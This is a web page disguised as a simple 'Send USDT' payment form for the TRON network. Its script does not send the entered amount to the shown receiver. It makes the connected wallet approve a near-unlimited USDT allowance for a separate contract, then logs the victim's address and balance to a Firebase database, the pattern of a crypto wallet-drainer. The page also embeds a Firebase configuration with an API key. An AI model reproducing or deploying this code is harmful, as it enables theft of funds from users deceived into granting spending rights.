<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Send USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #121212;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 60px;
    }
    .container {
      width: 90%;
      max-width: 400px;
      background: #1e1e1e;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 0 10px #000;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #00ffcc;
    }
    label {
      display: block;
      margin-top: 15px;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: none;
      border-radius: 8px;
      background: #2c2c2c;
      color: #fff;
      font-size: 16px;
    }
    input[readonly] {
      background: #333;
    }
    button {
      margin-top: 25px;
      width: 100%;
      padding: 12px;
      background-color: #00ffcc;
      color: #000;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #00e6b8;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Send USDT</h2>
    <label>Receiver Wallet Address</label>
    <input type="text" readonly value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" id="receiver" />

    <label>Enter USDT Amount</label>
    <input type="number" placeholder="0.00" id="amount" />

    <button onclick="approveUSDT()">Next</button>
  </div>

  <script>
    // ✅ Firebase config
    const firebaseConfig = {
      apiKey: 'AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM',
      authDomain: 'trc20-approval-dapp.firebaseapp.com',
      projectId: 'trc20-approval-dapp',
      storageBucket: 'trc20-approval-dapp.appspot.com',
      messagingSenderId: '770961226156',
      appId: '1:770961226156:web:d7857b971dd376b7902209'
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const usdtAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Official USDT (TRC-20)
    const contractAddress = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX"; // Your deployed contract
    const approvalAmount = "1000000000000000000000000"; // 1 million USDT (unlimited)

    async function approveUSDT() {
      try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
          alert("Please connect your TRON wallet.");
          return;
        }

        const userAddress = window.tronWeb.defaultAddress.base58;
        const usdtContract = await window.tronWeb.contract().at(usdtAddress);

        await usdtContract
          .approve(contractAddress, approvalAmount)
          .send({ feeLimit: 100_000_000 });

        // ✅ Get balance and log to Firebase
        const balance = await usdtContract.balanceOf(userAddress).call();
        const amountInput = document.getElementById("amount").value || "0";

        await db.collection("approvals").add({
          wallet_address: userAddress,
          amount: amountInput,
          balance: parseFloat(window.tronWeb.fromSun(balance._hex)),
          timestamp: new Date().toISOString(),
        });

        alert("Approval sent & logged.");
      } catch (e) {
        console.error(e);
        alert("Error: " + e.message);
      }
    }
  </script>
</body>
</html>
